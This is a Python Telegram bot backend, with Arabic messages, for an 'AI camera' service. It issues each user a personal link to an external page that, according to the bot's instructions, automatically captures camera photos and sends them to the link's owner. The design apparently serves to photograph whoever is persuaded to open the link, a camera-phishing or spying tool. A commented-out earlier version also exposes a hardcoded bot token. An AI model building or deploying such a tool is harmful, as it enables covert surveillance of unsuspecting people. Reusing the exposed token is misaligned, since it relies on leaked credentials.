# import telebot
# import time
# import logging
# from datetime import datetime
# from requests.exceptions import ReadTimeout, ConnectionError
# from flask import Flask, request, jsonify
# from threading import Thread
# import os

# # ---------------------------------------------
# # 1. إعدادات السيرفر الوهمي (لإبقاء البوت يعمل على Render)
# # ---------------------------------------------
# app = Flask(__name__)

# # إحصائيات (تعريفها هنا لتكون متاحة للجميع)
# user_stats = {}
# total_photos_received = 0

# @app.route('/')
# def home():
#     return """
#     <!DOCTYPE html>
#     <html lang="ar" dir="rtl">
#     <head>
#         <meta charset="UTF-8">
#         <meta name="viewport" content="width=device-width, initial-scale=1.0">
#         <title>كاميرا الذكاء الاصطناعي</title>
#         <style>
#             body {
#                 font-family: Arial, sans-serif;
#                 background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
#                 color: white;
#                 text-align: center;
#                 padding: 50px;
#             }
#             .container {
#                 background: rgba(255,255,255,0.1);
#                 backdrop-filter: blur(10px);
#                 padding: 30px;
#                 border-radius: 15px;
#                 max-width: 600px;
#                 margin: 0 auto;
#                 box-shadow: 0 10px 30px rgba(0,0,0,0.3);
#             }
#             h1 {
#                 color: #4fc3f7;
#             }
#             .status {
#                 background: #2e7d32;
#                 padding: 10px;
#                 border-radius: 5px;
#                 margin: 20px 0;
#             }
#         </style>
#     </head>
#     <body>
#         <div class="container">
#             <h1>🤖 بوت كاميرا الذكاء الاصطناعي</h1>
#             <div class="status">✅ البوت يعمل بنجاح</div>
#             <p>تم تشغيل البوت في: <strong>""" + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + """</strong></p>
#             <hr>
#             <p>استخدم الأمر /start في تلجرام للحصول على رابطك الشخصي</p>
#         </div>
#     </body>
#     </html>
#     """

# @app.route('/webhook', methods=['POST'])
# def webhook():
#     """للتكامل مع خدمات خارجية إذا لزم الأمر"""
#     data = request.json
#     return jsonify({"status": "ok", "message": "Webhook received"})

# def run():
#     app.run(host='0.0.0.0', port=8080)

# def keep_alive():
#     t = Thread(target=run)
#     t.daemon = True
#     t.start()

# # ---------------------------------------------
# # 2. إعدادات بوت تيليجرام
# # ---------------------------------------------
# TOKEN = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg'
# bot = telebot.TeleBot(TOKEN)

# # رابط GitHub Pages الخاص بك (صفحة الكاميرا)
# BASE_URL = "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/" 

# # إعدادات التسجيل
# logging.basicConfig(
#     level=logging.INFO,
#     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
# )
# logger = logging.getLogger(__name__)

# # ---------------------------------------------
# # 3. معالجة الأوامر
# # ---------------------------------------------

# @bot.message_handler(commands=['start'])
# def send_welcome(message):
#     user_id = message.chat.id
#     user_name = message.from_user.first_name
    
#     # تسجيل المستخدم في الإحصائيات
#     if user_id not in user_stats:
#         user_stats[user_id] = {
#             "name": user_name,
#             "photo_count": 0,
#             "first_seen": datetime.now(),
#             "last_active": datetime.now()
#         }
#     else:
#         user_stats[user_id]["last_active"] = datetime.now()
    
#     # دمج رابط الموقع مع ايدي المستخدم
#     personal_link = f"{BASE_URL}?id={user_id}"
    
#     # إنشاء كيبورد (لوحة مفاتيح) تفاعلية
#     markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
#     # ✅ التعديل: زر لنسخ الرابط (بدلاً من فتحه)
#     copy_btn = telebot.types.InlineKeyboardButton(
#         text="📋 انسخ الرابط", 
#         callback_data=f"copy_{user_id}"
#     )
    
#     # زر للحصول على التعليمات
#     help_btn = telebot.types.InlineKeyboardButton(
#         text="❓ التعليمات", 
#         callback_data="help"
#     )
    
#     # زر للإحصائيات
#     stats_btn = telebot.types.InlineKeyboardButton(
#         text="📊 إحصائياتي", 
#         callback_data="stats"
#     )
    
#     markup.add(copy_btn)
#     markup.add(help_btn, stats_btn)
    
#     response = (
#         f"🎉 أهلاً بك *{user_name}*!\n\n"
#         f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
#         f"`{personal_link}`\n\n"
#         f"⚠️ *تنبيه مهم جداً:*\n"
#         f"❌ *لا تفتح الرابط من داخل تليجرام* - الكاميرا لن تعمل!\n"
#         f"✅ *انسخ الرابط* وافتحه في متصفح خارجي (Chrome, Safari)\n\n"
#         f"📌 *طريقة الاستخدام الصحيحة:*\n"
#         f"1. اضغط على زر \"انسخ الرابط\"\n"
#         f"2. اضغط مع الاستمرار على الرابط واختر \"نسخ\"\n"
#         f"3. افتح متصفح كروم أو سفاري\n"
#         f"4. الصق الرابط في شريط العنوان\n"
#         f"5. اسمح بالوصول إلى الكاميرا\n"
#         f"6. سيتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
#         f"🔒 *ملاحظة:* الرابط خاص بك فقط ولا يشاركه أحد آخر"
#     )
    
#     bot.send_message(user_id, response, 
#                     parse_mode="Markdown",
#                     reply_markup=markup)
    
#     logger.info(f"New user started: {user_name} (ID: {user_id})")

# # ✅ إضافة دالة جديدة لمعالجة نسخ الرابط
# @bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
# def copy_link(call):
#     """نسخ الرابط عند الضغط على الزر"""
#     user_id = call.data.replace("copy_", "")
#     personal_link = f"{BASE_URL}?id={user_id}"
    
#     # إجابة على الضغط
#     bot.answer_callback_query(call.id, "📋 اضغط مع الاستمرار على الرابط لنسخه!")
    
#     # إرسال رسالة تحتوي على الرابط مع تعليمات
#     bot.send_message(
#         call.message.chat.id,
#         f"📋 *رابطك الشخصي:*\n"
#         f"`{personal_link}`\n\n"
#         f"📌 *طريقة النسخ والاستخدام:*\n"
#         f"1️⃣ اضغط مع الاستمرار على الرابط أعلاه\n"
#         f"2️⃣ اختر \"نسخ\" من القائمة\n"
#         f"3️⃣ افتح متصفح كروم أو سفاري\n"
#         f"4️⃣ الصق الرابط في شريط العنوان\n"
#         f"5️⃣ اسمح بالوصول إلى الكاميرا\n\n"
#         f"⚠️ *تذكير مهم:* لا تفتح الرابط من داخل تليجرام!",
#         parse_mode="Markdown"
#     )

# @bot.message_handler(commands=['stats'])
# def show_stats(message):
#     user_id = message.chat.id
#     user_name = message.from_user.first_name
    
#     if user_id in user_stats:
#         user_stat = user_stats[user_id]
#         response = (
#             f"📊 *إحصائياتك الشخصية*\n\n"
#             f"👤 الاسم: {user_stat['name']}\n"
#             f"🆔 رقمك: `{user_id}`\n"
#             f"📸 عدد الصور المستلمة: {user_stat['photo_count']}\n"
#             f"📅 تاريخ التسجيل: {user_stat['first_seen'].strftime('%Y-%m-%d')}\n"
#             f"🕐 آخر نشاط: {user_stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
#             f"🌐 *إحصائيات عامة:*\n"
#             f"👥 عدد المستخدمين: {len(user_stats)}\n"
#             f"🖼️ إجمالي الصور: {total_photos_received}"
#         )
#     else:
#         response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    
#     bot.send_message(user_id, response, parse_mode="Markdown")

# @bot.message_handler(commands=['help'])
# def send_help(message):
#     help_text = (
#         "📖 *دليل استخدام البوت*\n\n"
#         "🎯 *الأوامر المتاحة:*\n"
#         "✅ /start - الحصول على رابطك الشخصي\n"
#         "📊 /stats - عرض إحصائياتك\n"
#         "❓ /help - عرض هذه التعليمات\n\n"
#         "🔧 *كيف يعمل البوت:*\n"
#         "1. اضغط على /start للحصول على رابطك الشخصي\n"
#         "2. اضغط على زر \"انسخ الرابط\"\n"
#         "3. انسخ الرابط وافتحه في متصفح خارجي (Chrome/Safari)\n"
#         "4. اسمح بالوصول إلى الكاميرا\n"
#         "5. يتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
#         "⚠️ *ملاحظات هامة:*\n"
#         "• ❌ لا تفتح الرابط من داخل تليجرام - الكاميرا لن تعمل!\n"
#         "• ✅ يجب فتح الرابط في متصفح خارجي فقط\n"
#         "• الصور تصل فقط لصاحب الرابط\n"
#         "• لا يتم حفظ الصور في أي سيرفر\n\n"
#         "🛠️ للمساعدة التقنية: @khaled_developer"
#     )
#     bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

# @bot.message_handler(commands=['broadcast'])
# def broadcast_message(message):
#     """للبث لجميع المستخدمين (للمطور فقط)"""
#     user_id = message.chat.id
    
#     # التحقق إذا كان المستخدم هو المطور (يمكن تعديل ID)
#     DEVELOPER_ID = 6002805119  # ضع رقمك هنا
    
#     if user_id != DEVELOPER_ID:
#         bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
#         return
    
#     # استخراج الرسالة من الأمر
#     command_parts = message.text.split(' ', 1)
#     if len(command_parts) < 2:
#         bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
#         return
    
#     broadcast_text = command_parts[1]
    
#     # البث لجميع المستخدمين
#     success_count = 0
#     fail_count = 0
    
#     for uid in user_stats.keys():
#         try:
#             bot.send_message(uid, 
#                            f"📢 *إشعار من المطور:*\n\n{broadcast_text}", 
#                            parse_mode="Markdown")
#             success_count += 1
#             time.sleep(0.1)
#         except Exception as e:
#             logger.error(f"Failed to send to {uid}: {e}")
#             fail_count += 1
    
#     bot.reply_to(message, 
#                 f"✅ تم البث بنجاح!\n\n"
#                 f"✓ تم الإرسال لـ: {success_count} مستخدم\n"
#                 f"✗ فشل الإرسال لـ: {fail_count} مستخدم")

# # ---------------------------------------------
# # 4. معالجة الصور الواردة
# # ---------------------------------------------

# @bot.message_handler(content_types=['photo'])
# def handle_photos(message):
#     global total_photos_received
    
#     user_id = message.chat.id
#     user_name = message.from_user.first_name if message.from_user else "مجهول"
    
#     # تحديث إحصائيات المستخدم
#     if user_id in user_stats:
#         user_stats[user_id]["photo_count"] += 1
#         user_stats[user_id]["last_active"] = datetime.now()
#     else:
#         user_stats[user_id] = {
#             "name": user_name,
#             "photo_count": 1,
#             "first_seen": datetime.now(),
#             "last_active": datetime.now()
#         }
    
#     total_photos_received += 1
    
#     # استخراج أفضل جودة للصورة
#     photo = message.photo[-1]
#     file_id = photo.file_id
    
#     # الحصول على معلومات الملف
#     file_info = bot.get_file(file_id)
#     file_size = file_info.file_size / 1024
    
#     # إرسال تأكيد استلام
#     caption = (
#         f"✅ تم استلام صورة جديدة!\n\n"
#         f"👤 من: {user_name}\n"
#         f"🆔 الرقم: `{user_id}`\n"
#         f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
#         f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
#         f"📊 الإجمالي الكلي: {total_photos_received}"
#     )
    
#     bot.reply_to(message, caption, parse_mode="Markdown")
    
#     logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")

# # ---------------------------------------------
# # 5. معالجة Callback Queries (الزر التفاعلي)
# # ---------------------------------------------

# @bot.callback_query_handler(func=lambda call: True)
# def handle_callback(call):
#     if call.data == "help":
#         send_help(call.message)
#         bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    
#     elif call.data == "stats":
#         show_stats(call.message)
#         bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")
    
#     elif call.data.startswith("copy_"):
#         # تم معالجتها في الدالة المنفصلة أعلاه
#         pass

# # ---------------------------------------------
# # 6. معالجة الرسائل النصية العادية
# # ---------------------------------------------

# @bot.message_handler(func=lambda message: True)
# def handle_all_messages(message):
#     if message.text and message.text.startswith('/'):
#         bot.reply_to(message, 
#                     "❌ أمر غير معروف!\n\n"
#                     "✅ الأوامر المتاحة:\n"
#                     "/start - للحصول على رابطك\n"
#                     "/stats - لعرض إحصائياتك\n"
#                     "/help - للتعليمات والمساعدة")
#     else:
#         welcome_text = (
#             f"مرحباً {message.from_user.first_name}! 👋\n\n"
#             f"يمكنك استخدام الأوامر التالية:\n"
#             f"• /start - للحصول على رابطك الشخصي\n"
#             f"• /stats - لعرض إحصائياتك\n"
#             f"• /help - للتعليمات\n\n"
#             f"أو اضغط على زر \"انسخ الرابط\" بعد /start 📋"
#         )
#         bot.reply_to(message, welcome_text)

# # ---------------------------------------------
# # 7. تشغيل البوت والسيرفر معاً
# # ---------------------------------------------

# # تشغيل السيرفر في الخلفية
# keep_alive()

# print("=" * 50)
# print("🤖 بوت كاميرا الذكاء الاصطناعي")
# print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
# print("=" * 50)

# # حلقة التشغيل اللانهائية
# while True:
#     try:
#         logger.info("Starting bot polling...")
#         bot.infinity_polling(timeout=60, long_polling_timeout=60)
#     except (ReadTimeout, ConnectionError) as e:
#         logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
#         time.sleep(5)
#     except Exception as e:
#         logger.error(f"Unexpected error: {e}")
#         time.sleep(10)




import telebot
import time
import logging
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify
from threading import Thread
import os

# ✅ إضافة استيراد التشفير
from encryption import encrypt_id, decrypt_id

# ---------------------------------------------
# 1. إعدادات السيرفر الوهمي
# ---------------------------------------------
app = Flask(__name__)

user_stats = {}
total_photos_received = 0

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>كاميرا الذكاء الاصطناعي</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                color: white;
                text-align: center;
                padding: 50px;
            }
            .container {
                background: rgba(255,255,255,0.1);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 15px;
                max-width: 600px;
                margin: 0 auto;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }
            h1 {
                color: #4fc3f7;
            }
            .status {
                background: #2e7d32;
                padding: 10px;
                border-radius: 5px;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤖 بوت كاميرا الذكاء الاصطناعي</h1>
            <div class="status">✅ البوت يعمل بنجاح</div>
            <p>تم تشغيل البوت في: <strong>""" + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + """</strong></p>
            <hr>
            <p>استخدم الأمر /start في تلجرام للحصول على رابطك الشخصي</p>
        </div>
    </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    return jsonify({"status": "ok", "message": "Webhook received"})

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 2. إعدادات بوت تيليجرام
# ---------------------------------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة")

BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
DEVELOPER_CHAT_ID = os.environ.get("DEVELOPER_CHAT_ID")
if DEVELOPER_CHAT_ID:
    DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)
else:
    DEVELOPER_CHAT_ID = 6002805119

bot = telebot.TeleBot(TOKEN)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ---------------------------------------------
# 3. معالجة الأوامر
# ---------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name
    
    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()
    
    # ✅ استخدام التشفير
    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"
    
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    copy_btn = telebot.types.InlineKeyboardButton(
        text="📋 انسخ الرابط", 
        callback_data=f"copy_{encrypted}"  # ✅ مشفر
    )
    
    help_btn = telebot.types.InlineKeyboardButton(
        text="❓ التعليمات", 
        callback_data="help"
    )
    
    stats_btn = telebot.types.InlineKeyboardButton(
        text="📊 إحصائياتي", 
        callback_data="stats"
    )
    
    markup.add(copy_btn)
    markup.add(help_btn, stats_btn)
    
    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
        f"`{personal_link}`\n\n"
        f"⚠️ *تنبيه مهم جداً:*\n"
        f"❌ *لا تفتح الرابط من داخل تليجرام* - الكاميرا لن تعمل!\n"
        f"✅ *انسخ الرابط* وافتحه في متصفح خارجي (Chrome, Safari)\n\n"
        f"📌 *طريقة الاستخدام الصحيحة:*\n"
        f"1. اضغط على زر \"انسخ الرابط\"\n"
        f"2. اضغط مع الاستمرار على الرابط واختر \"نسخ\"\n"
        f"3. افتح متصفح كروم أو سفاري\n"
        f"4. الصق الرابط في شريط العنوان\n"
        f"5. اسمح بالوصول إلى الكاميرا\n"
        f"6. سيتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
        f"🔒 *ملاحظة:* الرابط خاص بك فقط ولا يشاركه أحد آخر"
    )
    
    bot.send_message(user_id, response, 
                    parse_mode="Markdown",
                    reply_markup=markup)
    
    logger.info(f"New user started: {user_name} (ID: {user_id})")

# ✅ تعديل دالة copy_link
@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_link(call):
    encrypted = call.data.replace("copy_", "")
    personal_link = f"{BASE_URL}?q={encrypted}"
    
    bot.answer_callback_query(call.id, "📋 اضغط مع الاستمرار على الرابط لنسخه!")
    
    bot.send_message(
        call.message.chat.id,
        f"📋 *رابطك الشخصي:*\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة النسخ والاستخدام:*\n"
        f"1️⃣ اضغط مع الاستمرار على الرابط أعلاه\n"
        f"2️⃣ اختر \"نسخ\" من القائمة\n"
        f"3️⃣ افتح متصفح كروم أو سفاري\n"
        f"4️⃣ الصق الرابط في شريط العنوان\n"
        f"5️⃣ اسمح بالوصول إلى الكاميرا\n\n"
        f"⚠️ *تذكير مهم:* لا تفتح الرابط من داخل تليجرام!",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    
    if user_id in user_stats:
        user_stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {user_stat['name']}\n"
            f"🆔 رقمك: `{user_id}`\n"
            f"📸 عدد الصور المستلمة: {user_stat['photo_count']}\n"
            f"📅 تاريخ التسجيل: {user_stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {user_stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي\n"
        "2. اضغط على زر \"انسخ الرابط\"\n"
        "3. انسخ الرابط وافتحه في متصفح خارجي (Chrome/Safari)\n"
        "4. اسمح بالوصول إلى الكاميرا\n"
        "5. يتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
        "⚠️ *ملاحظات هامة:*\n"
        "• ❌ لا تفتح الرابط من داخل تليجرام - الكاميرا لن تعمل!\n"
        "• ✅ يجب فتح الرابط في متصفح خارجي فقط\n"
        "• الصور تصل فقط لصاحب الرابط\n"
        "• لا يتم حفظ الصور في أي سيرفر\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.chat.id
    
    if user_id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
        return
    
    broadcast_text = command_parts[1]
    
    success_count = 0
    fail_count = 0
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, 
                           f"📢 *إشعار من المطور:*\n\n{broadcast_text}", 
                           parse_mode="Markdown")
            success_count += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail_count += 1
    
    bot.reply_to(message, 
                f"✅ تم البث بنجاح!\n\n"
                f"✓ تم الإرسال لـ: {success_count} مستخدم\n"
                f"✗ فشل الإرسال لـ: {fail_count} مستخدم")

# ---------------------------------------------
# 4. معالجة الصور الواردة
# ---------------------------------------------

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    
    user_id = message.chat.id
    user_name = message.from_user.first_name if message.from_user else "مجهول"
    
    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    
    total_photos_received += 1
    
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024
    
    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 الرقم: `{user_id}`\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    
    bot.reply_to(message, caption, parse_mode="Markdown")
    
    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")

# ---------------------------------------------
# 5. معالجة Callback Queries
# ---------------------------------------------

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        send_help(call.message)
        bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    
    elif call.data == "stats":
        show_stats(call.message)
        bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")
    
    elif call.data.startswith("copy_"):
        pass

# ---------------------------------------------
# 6. معالجة الرسائل النصية
# ---------------------------------------------

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, 
                    "❌ أمر غير معروف!\n\n"
                    "✅ الأوامر المتاحة:\n"
                    "/start - للحصول على رابطك\n"
                    "/stats - لعرض إحصائياتك\n"
                    "/help - للتعليمات والمساعدة")
    else:
        welcome_text = (
            f"مرحباً {message.from_user.first_name}! 👋\n\n"
            f"يمكنك استخدام الأوامر التالية:\n"
            f"• /start - للحصول على رابطك الشخصي\n"
            f"• /stats - لعرض إحصائياتك\n"
            f"• /help - للتعليمات\n\n"
            f"أو اضغط على زر \"انسخ الرابط\" بعد /start 📋"
        )
        bot.reply_to(message, welcome_text)

# ---------------------------------------------
# 7. تشغيل البوت
# ---------------------------------------------

keep_alive()

print("=" * 50)
print("🤖 بوت كاميرا الذكاء الاصطناعي")
print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 50)

while True:
    try:
        logger.info("Starting bot polling...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except (ReadTimeout, ConnectionError) as e:
        logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        time.sleep(10)
